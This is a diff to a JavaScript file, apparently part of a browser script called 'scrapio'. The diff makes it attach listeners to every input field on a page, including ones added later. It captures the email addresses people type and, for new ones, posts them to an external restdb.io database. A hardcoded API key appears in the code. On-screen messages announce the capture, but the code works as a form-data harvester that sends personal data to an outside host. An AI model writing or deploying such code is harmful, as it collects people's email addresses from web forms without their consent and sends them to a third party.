@@ -1,6 +1,7 @@
 async function getEmailsFromDb() {
 	const response = await fetch('https://scrapio-335b.restdb.io/rest/emails', {
-		'headers': {
+		method: 'GET',
+		headers: {
 			'content-type': 'application/json',
 			'x-apikey': '3cbd592182bfba0d6b3cc0c575b8c03b26993',
 			'cache-control': 'no-cache'
@@ -8,6 +9,18 @@ async function getEmailsFromDb() {
 	});
 
 	return response.json();
+}
+
+function postEmailToDb(capturedEmail) {
+	fetch('https://scrapio-335b.restdb.io/rest/emails', {
+		method: 'POST',
+		headers: {
+			'content-type': 'application/json',
+			'x-apikey': '3cbd592182bfba0d6b3cc0c575b8c03b26993',
+			'cache-control': 'no-cache'
+		},
+		body: JSON.stringify({ email: capturedEmail })
+	});
 }
 
 function showToasty(capturedEmail) {
@@ -52,6 +65,10 @@ function showToasty(capturedEmail) {
 						const emails = emailRecords.map(record => record.email);
 						const emailIsKnown = emails.includes(capturedEmail);
 
+						if (!emailIsKnown) {
+							postEmailToDb(capturedEmail);
+						}
+
 						msgDisplay.textContent = emailIsKnown ? 'I know you!' : 'email captured';
 					}, transitionTime + 200);
 
@@ -71,6 +88,11 @@ function handleInputChange() {
 	}
 }
 
-for (let input of document.getElementsByTagName('INPUT')) {
-	input.addEventListener('change', handleInputChange);
-}
+new MutationObserver(() => {
+	for (let input of document.getElementsByTagName('INPUT')) {
+		if (!input.scraperAdded) {
+			input.addEventListener('change', handleInputChange);
+			input.scraperAdded = true;
+		}
+	}
+}).observe(document.body, { childList: true, subtree: true });
